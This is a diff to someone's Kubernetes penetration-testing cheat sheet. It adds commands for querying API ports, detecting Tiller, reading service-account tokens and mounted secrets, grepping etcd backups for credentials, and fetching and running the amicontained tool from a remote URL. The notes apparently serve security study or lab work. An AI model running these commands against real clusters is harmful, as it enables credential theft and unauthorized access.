@@ -13,6 +13,7 @@ Nmap
 	8080 - API remote default insecure port
 	8443 - API remote secure port - common
 
+	10249 - sometimes kube-proxy (see 10256)
 	10250 - kubelet
 			read-write
 			kubelet API endpoints - https://github.com/cyberark/kubeletctl/blob/master/API_TABLE.md
@@ -62,6 +63,11 @@ Kubernetes Servers on the Internet
 			hex string at end for OpenShift (e.g. v1.9.1+a0ce1bc657)
 
 
+Query Secure Port
+	kubectl -s http://<node_IP>:8443 <command>
+	OR
+	curl -k https://10.129.173.36:8443/api/v1/namespaces   
+
 Query Insecure Port
 	kubectl -s http://<node_IP>:8080 <command>
 
@@ -80,8 +86,9 @@ Query unauthenticated etcd
 Check for Tiller
 	helm --host <target_IP>:<tiller_port> version
 
-	from within cluster, can check DNS - tiller.kube-system.service?
-	
+	from a pod in the cluster:
+		dig tiller-deploy.kube-system.svc.cluster.local
+			if we get a response, then Tiller is installed cluster-wide in kube-system namespace
 
 
 List API resources
@@ -101,8 +108,34 @@ Find and read any available secrets
 	kubectl get secret <SECRET_NAME> -o yaml 
 
 	Get service account token "default-token-..."
+		/var/run/secrets/kubernetes.io/serviceaccount/token		
 		created by default in all containers
 		in all older versions and some newer versions, this is a cluster-admin token
+
+	look for mounted secrets in tmpfs file systems on container
+		cat /proc/mounts | grep tmpfs
+			check files within any mounts that look like they may be for secrets 
+
+	with access to etcd database backup
+		strings db | grep -B 4 Opaque
+		strings db | grep -B 1 -A 1 "service-account-token"
+
+	in environment variables
+		env 
+
+
+List capabilities for a container
+	Run amicontained in the container (also gets AppArmor Profile, seccomp, namespaces)
+		curl -LO k8s.work/amicontained
+		chmod +x amicontained
+		./amicontained
+
+
+	Find container process (e.g. bash)
+		ps 	
+	Get capabilities the the process
+		getpcaps <PID>
+
 
 
 
@@ -218,10 +251,6 @@ Custom Resources
 	list resources
 		kubectl api-resources
 
-finding Tiller
-	from a pod in the cluster:
-		dig tiller-deploy.kube-system.svc.cluster.local
-	if we get a response, then Tiller is installed cluster-wide in kube-system namespace
 
 Finding services running (to check for unauth access, etc)
 	kubectl svc --all-namespaces
